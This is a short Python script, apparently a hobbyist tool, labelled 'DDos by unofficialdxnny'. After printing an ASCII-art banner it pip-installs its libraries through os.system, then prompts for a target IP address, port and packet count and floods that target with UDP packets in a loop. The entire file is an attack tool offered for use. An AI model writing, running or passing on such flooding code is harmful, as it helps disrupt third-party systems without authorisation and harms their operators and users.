import socket
from pystyle import *
import os


os.system('cls & title checking and installing libraries')


banner = '''

⠀⠀⠀⢀⡴⠋⠉⢉⠍⣉⡉⠉⠉⠉⠓⠲⠶⠤⣄⠀⠀⠀
⠀⠀⢀⠎⠀⠪⠾⢊⣁⣀⡀⠄⠀⠀⡌⠉⠁⠄⠀⢳⠀⠀
⠀⣰⠟⣢⣤⣐⠘⠛⣻⠻⠭⠇⠀⢤⡶⠟⠛⠂⠀⢌⢷⡀
⢸⢈⢸⠠⡶⠬⣉⡉⠁⠀⣠⢄⡀⠀⠳⣄⠑⠚⣏⠁⣪⠇
⠀⢯⡊⠀⠹⡦⣼⣍⠛⢲⠯⢭⣁⣲⣚⣁⣬⢾⢿⠈⡜⠀
⠀⠀⠙⡄⠀⠘⢾⡉⠙⡟⠶⢶⣿⣶⣿⣶⣿⣾⣿⠀⡇⠀
⠀⠀⠀⠙⢦⣤⡠⡙⠲⠧⠀⣠⣇⣨⣏⣽⡹⠽⠏⠀⡇⠀
⠀⠀⠀⠀⠀⠈⠙⠦⢕⡋⠶⠄⣤⠤⠤⠤⠤⠂⡠⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠒⠦⠤⣄⣀⣀⣀⣠⠔⠁⠀

            by unofficialdxnny
'''

Write.Print(banner, Colors.red_to_black, interval=0)

libraries = ["socket", "pystyle"]


for library in libraries:
    os.system(f'title Installing {library}')
    os.system(f"pip install {library}")
    



os.system('cls & title DDos by unofficialdxnny')

Write.Print(banner, Colors.red_to_black, interval=0)

ip_address =  Write.Input("Enter IP Address> ", Colors.red, interval=0.0025)

ip_port =  int(input("Port number> "))

amount = int(input("How many packets?> "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

x = 0

while x != amount:
    sock.sendto(b"Hello, World!", (ip_address, ip_port))
    
    x = x+1


sock.close()

